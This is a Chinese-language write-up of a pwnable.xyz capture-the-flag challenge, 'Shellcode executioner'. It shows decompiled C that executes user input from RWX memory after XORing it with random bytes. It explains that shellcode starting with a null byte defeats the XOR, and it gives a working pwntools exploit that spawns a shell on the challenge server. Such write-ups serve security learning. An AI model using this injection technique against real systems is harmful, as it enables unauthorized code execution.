### 知识点

- shellcode



### 关键代码

```c

undefined8 main(void)

{
  int __fd;
  size_t sVar1;
  undefined8 *UNRECOVERED_JUMPTABLE;
  undefined8 uVar2;
  int local_28;
  
  setup();
  solve_pow();
  puts("Shellcode executioner");
  __fd = open("/dev/urandom",0);
  if (__fd == -1) {
    puts("error");
    return 1;
  }
  read(__fd,key,0x7f);
  close(__fd);
  printf("Input: ");
  read(0,inpt,0x7f);                  // A
  local_28 = 0;
  while( true ) {                     // B
    sVar1 = strlen(inpt);
    if (sVar1 <= (ulong)(long)local_28) break;
    inpt[local_28] = inpt[local_28] ^ key[local_28];
    local_28 = local_28 + 1;
  }
  UNRECOVERED_JUMPTABLE = (undefined8 *)mmap((void *)0x0,0x1000,7,0x22,0,0);   // C
  *UNRECOVERED_JUMPTABLE = inpt._0_8_;
  UNRECOVERED_JUMPTABLE[1] = inpt._8_8_;
  UNRECOVERED_JUMPTABLE[2] = inpt._16_8_;
  UNRECOVERED_JUMPTABLE[3] = inpt._24_8_;
  UNRECOVERED_JUMPTABLE[4] = inpt._32_8_;
  UNRECOVERED_JUMPTABLE[5] = inpt._40_8_;
  UNRECOVERED_JUMPTABLE[6] = inpt._48_8_;
  UNRECOVERED_JUMPTABLE[7] = inpt._56_8_;
  UNRECOVERED_JUMPTABLE[8] = inpt._64_8_;
  UNRECOVERED_JUMPTABLE[9] = inpt._72_8_;
  UNRECOVERED_JUMPTABLE[10] = inpt._80_8_;
  UNRECOVERED_JUMPTABLE[0xb] = inpt._88_8_;
  UNRECOVERED_JUMPTABLE[0xc] = inpt._96_8_;
  UNRECOVERED_JUMPTABLE[0xd] = inpt._104_8_;
  UNRECOVERED_JUMPTABLE[0xe] = inpt._112_8_;
  UNRECOVERED_JUMPTABLE[0xf] = inpt._120_8_;
                    /* WARNING: Could not recover jumptable at 0x00100ecf. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar2 = (*(code *)UNRECOVERED_JUMPTABLE)();                                   // D
  return uVar2;
}


```



### 描述

- 程序先读取一段输入（A行），经过混淆（B处），放入一段mmap得到的内存（C行）里执行（D行）；
- 因为混淆是跟随机数做xor，所以得想办法绕过；
- 而循环的条件为`strlen(inpt);`，只要shellcode是以空字符开头的，就能绕过混淆；



### 脚本

```python
from pwn import *

context(os='linux', arch='amd64')

p = remote('svc.pwnable.xyz', 30025)
# p = process('./challenge')
x = int(p.recvuntil(b'> ')[len('POW: x + y == '):-3], 16)
payload = '{} 0'.format(x)
payload = str.encode(payload)
p.sendline(payload)

shellcode = asm('add bh, bh;' + shellcraft.sh())
p.sendafter(b'Input: ', shellcode)
p.interactive()

```

